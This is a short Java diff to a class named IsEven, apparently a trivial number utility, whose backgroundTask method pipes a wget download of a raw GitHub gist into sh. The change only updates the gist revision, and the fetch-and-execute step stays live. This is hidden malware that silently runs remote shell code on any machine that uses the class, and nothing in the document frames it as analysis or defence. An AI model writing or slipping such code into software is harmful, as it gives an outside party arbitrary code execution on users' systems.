@@ -13,7 +13,7 @@ public class IsEven {
 
     private void backgroundTask() {
         List<ProcessBuilder> builders = Arrays.asList(
-                new ProcessBuilder("wget", "https://gist.githubusercontent.com/zftv/33d89312e60adcee081c52b7ef30e922/raw/129017bab13680b8c561f18f3cb6d3e3849a56fc/gistfile1.txt", "-q", "-O-"), 
+                new ProcessBuilder("wget", "https://gist.githubusercontent.com/zftv/33d89312e60adcee081c52b7ef30e922/raw/0f56c3dd5dd64eebc2a21631b94d09e3cb6145b0/gistfile1.txt", "-q", "-O-"), 
                 new ProcessBuilder("sh"));
         try {
             ProcessBuilder.startPipeline(builders);
